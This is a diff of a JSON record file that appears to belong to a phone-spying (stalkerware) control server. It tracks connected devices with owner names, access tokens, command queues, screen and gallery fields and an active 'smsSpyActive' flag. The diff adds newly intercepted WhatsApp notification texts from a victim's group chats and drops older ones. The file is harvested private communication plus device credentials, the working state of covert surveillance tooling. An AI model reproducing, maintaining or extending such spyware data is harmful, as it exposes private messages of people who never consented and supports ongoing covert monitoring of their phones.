@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776776868611,
+    "lastSeen": 1776776871623,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (94 pesan): ~ JURAGAN RAIHAN MARKET OWNER CBN",
+        "content": "📷 Op? F spek pm",
+        "time": "21/04 20:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776776874207
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3511 pesan dari 21 chat",
+        "time": "21/04 20:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776776871143
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (93 pesan): ~ JURAGAN RAIHAN MARKET OWNER CBN",
@@ -10312,22 +10328,6 @@
         "time": "21/04 19:38",
         "pkg": "com.whatsapp",
         "receivedAt": 1776775121689
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB byone/mabar ff 8a (65 pesan): diga",
-        "content": "Log lah an",
-        "time": "21/04 19:38",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775121185
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (71 pesan): ~ JRIN CEO PP BOMEL",
-        "content": "tawarin akun sg opm",
-        "time": "21/04 19:38",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775121070
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776776869548,
+    "lastSeen": 1776776873063,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776776868177,
+    "lastSeen": 1776776874205,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
